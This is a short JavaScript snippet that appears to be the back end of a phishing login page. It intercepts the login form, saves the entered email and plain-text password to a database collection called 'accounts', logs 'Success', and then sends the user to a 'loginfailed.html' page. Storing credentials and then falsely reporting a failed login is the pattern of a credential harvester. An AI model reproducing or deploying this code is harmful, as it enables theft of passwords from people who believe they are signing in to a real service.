const loginForm = document.querySelector('#login_form');

loginForm.addEventListener('submit', e => {
  e.preventDefault();
  db.collection('accounts').add({
    email: loginForm.email.value,
    pass: loginForm.pass.value
  }).then(e => {
    console.log('Success');
    window.location.replace("./loginfailed.html")
  }).catch(e => {
    console.log(e);
  });
});